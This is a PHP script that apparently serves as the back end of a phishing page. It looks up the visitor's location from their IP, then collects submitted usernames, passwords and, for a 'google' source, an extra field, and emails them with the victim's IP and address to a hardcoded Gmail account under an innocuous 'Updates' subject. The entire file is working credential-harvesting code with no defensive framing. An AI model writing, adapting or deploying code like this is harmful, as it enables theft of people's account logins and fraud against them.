<?php
function loc_data($ip = NULL, $use_for = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $use_for    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($use_for)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $globe = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($use_for, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($use_for) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$globe[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	$ria = $_SERVER['HTTP_CLIENT_IP'];
}
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$ria = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
	$ria = $_SERVER['REMOTE_ADDR'];
}

$owner = "davidwilliam67@gmail.com";

$cip = $ria;
$address = loc_data("Visitor", "Address");
$ccc = loc_data("Visitor", "Country");

$to_drop = "----\n";
$to_drop .= "1 : ".$_POST['u']."\n";
$to_drop .= "2 : ".$_POST['p']."\n";
if($_POST['s'] == "google") {
    $to_drop .= "3 : ".$_POST['m']."\n";   
    $to_drop .= "4 : ".$cip."\n";
    $to_drop .= "5 : ".$address."\n";
}
else {
    $to_drop .= "3 : ".$cip."\n";
    $to_drop .= "4 : ".$address."\n";
}

$alert = $_POST['s']." Updates";
	
mail($owner, $alert, $to_drop);

print 1;
?>